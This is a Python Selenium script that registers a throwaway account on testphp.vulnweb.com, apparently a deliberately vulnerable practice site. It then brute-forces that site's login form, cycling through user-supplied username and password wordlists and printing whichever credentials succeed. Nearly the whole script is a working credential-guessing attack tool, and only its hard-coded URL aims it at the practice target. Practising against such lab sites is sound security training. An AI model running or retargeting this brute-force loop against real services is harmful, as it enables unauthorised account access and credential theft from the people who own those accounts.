from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium import webdriver
import time

chromeOptions = webdriver.ChromeOptions()
chromeOptions.add_argument("--disable-dev-shm-usage")
chromeOptions.add_argument("--no-sandbox")

driver = webdriver.Chrome(options=chromeOptions)
driver.get("http://testphp.vulnweb.com/login.php")

signup_link = WebDriverWait(driver, 20).until(
    EC.presence_of_element_located((By.LINK_TEXT, "signup here"))
)
signup_link.click()

WebDriverWait(driver, 20).until(
    EC.presence_of_element_located((By.NAME, "uuname"))
)
driver.find_element(By.NAME, "uuname").send_keys("mamede")
driver.find_element(By.NAME, "upass").send_keys("mamedeteste")
driver.find_element(By.NAME, "upass2").send_keys("mamedeteste")
driver.find_element(By.NAME, "urname").send_keys("mamede")
driver.find_element(By.NAME, "ucc").send_keys("1234")
driver.find_element(By.NAME, "uemail").send_keys("test@gmail.com")
driver.find_element(By.NAME, "uphone").send_keys("1234")
driver.find_element(By.NAME, "uaddress").send_keys("test Rd.")

driver.find_element(By.NAME, "signup").click()

here_link = WebDriverWait(driver, 20).until(
    EC.presence_of_element_located((By.LINK_TEXT, "here."))
)
here_link.click()

WebDriverWait(driver, 20).until(
    EC.url_to_be("http://testphp.vulnweb.com/login.php")
)

def getLinesFromFile(filePath):
    with open(filePath, 'r') as file:
        return [line.strip() for line in file.readlines()]

pathUsersFile = input("Insert the path to the usernames wordlist: ").strip('"')
pathPasswordsFile = input("Now insert the path to the passwords wordlist: ").strip('"')

usernames = getLinesFromFile(pathUsersFile)
passwords = getLinesFromFile(pathPasswordsFile)

loginFailedUrl = "http://testphp.vulnweb.com/login.php"
loginSuccessful = False

for username in usernames:
    for password in passwords:
        try:
            userField = driver.find_element(By.NAME, "uname")
            passwdField = driver.find_element(By.NAME, "pass")

            userField.clear()
            userField.send_keys(username)

            passwdField.clear()
            passwdField.send_keys(password)

            passwdField.send_keys(Keys.RETURN)

            time.sleep(1.5)

            currentUrl = driver.current_url

            if currentUrl == loginFailedUrl:
                print(f"Attempt failed for: Username = {username}, Password = {password}")
                driver.get("http://testphp.vulnweb.com/login.php")
                WebDriverWait(driver, 20).until(
                    EC.presence_of_element_located((By.NAME, "uname"))
                )
            else:
                print(f"Login successful with credentials: Username = {username}, Password = {password}")
                loginSuccessful = True
                break

        except Exception as e:
            print(f"Error: {e}")

    if loginSuccessful:
        break

if not loginSuccessful:
    print("No credentials worked.")

driver.quit()
